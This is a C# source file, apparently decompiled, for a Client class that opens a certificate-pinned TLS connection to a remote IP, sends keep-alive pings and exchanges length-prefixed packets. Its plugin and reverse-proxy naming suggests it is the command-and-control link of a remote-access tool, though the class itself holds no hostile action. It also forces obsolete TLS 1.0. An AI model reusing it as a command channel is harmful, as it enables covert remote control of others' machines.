using System;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using Leb128;
using Plugin.Sock5;

namespace Plugin.Helper;

public class Client
{
	public Socket socket;

	public SslStream SslClient;

	public byte[] ClientBuffer;

	public bool ClientBufferRecevied;

	public int HeaderSize;

	public int Offset;

	public object SendSync;

	public bool itsConnect;

	public KeepPing keepPing;

	public ReverseProxyClient client;

	public void Connect(string ip, string port, bool itsmain)
	{
		try
		{
			socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			socket.ReceiveBufferSize = 512000;
			socket.SendBufferSize = 512000;
			socket.Connect(ip, Convert.ToInt32(port));
			if (!socket.Connected)
			{
				return;
			}
			itsConnect = true;
			SendSync = new object();
			SslClient = new SslStream(new NetworkStream(socket, ownsSocket: true), leaveInnerStreamOpen: false, ValidateServerCertificate);
			SslClient.AuthenticateAsClient(socket.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
			Offset = 0;
			HeaderSize = 4;
			ClientBuffer = new byte[HeaderSize];
			ClientBufferRecevied = false;
			if (itsmain)
			{
				keepPing = new KeepPing();
				keepPing.Send += delegate
				{
					Send(LEB128.Write(new object[1] { "abc" }));
				};
			}
			SslClient.BeginRead(ClientBuffer, Offset, HeaderSize, ReadData, null);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
			Disconnect();
		}
	}

	private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return Plugin.X509Certificate2.Equals(certificate);
	}

	public void Disconnect()
	{
		if (itsConnect)
		{
			itsConnect = false;
			ClientBuffer = null;
			HeaderSize = 0;
			Offset = 0;
			if (socket != null)
			{
				socket.Dispose();
			}
			if (SslClient != null)
			{
				SslClient.Dispose();
			}
			if (keepPing != null)
			{
				keepPing.Disconnect();
			}
		}
	}

	public void ReadData(IAsyncResult ar)
	{
		if (!itsConnect)
		{
			return;
		}
		try
		{
			int num = SslClient.EndRead(ar);
			if (num > 0)
			{
				HeaderSize -= num;
				Offset += num;
				if (!ClientBufferRecevied)
				{
					if (HeaderSize == 0)
					{
						HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
						if (HeaderSize > 0)
						{
							ClientBuffer = new byte[HeaderSize];
							Offset = 0;
							ClientBufferRecevied = true;
						}
					}
					else if (HeaderSize < 0)
					{
						Disconnect();
						return;
					}
				}
				else if (HeaderSize == 0)
				{
					Packet.Read(ClientBuffer, this);
					Offset = 0;
					HeaderSize = 4;
					ClientBuffer = new byte[HeaderSize];
					ClientBufferRecevied = false;
				}
				else if (HeaderSize < 0)
				{
					Disconnect();
					return;
				}
				SslClient.BeginRead(ClientBuffer, Offset, HeaderSize, ReadData, null);
			}
			else
			{
				Disconnect();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
			Disconnect();
		}
	}

	public void Error(string exp)
	{
		Send(LEB128.Write(new object[2] { "Error", exp }));
	}

	public void Send(byte[] Data)
	{
		if (!itsConnect)
		{
			return;
		}
		lock (SendSync)
		{
			try
			{
				byte[] bytes = BitConverter.GetBytes(Data.Length);
				byte[] array = new byte[4 + Data.Length];
				Array.Copy(bytes, 0, array, 0, bytes.Length);
				Array.Copy(Data, 0, array, 4, Data.Length);
				socket.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(array, 0, array.Length);
				SslClient.Flush();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				Disconnect();
			}
		}
	}
}
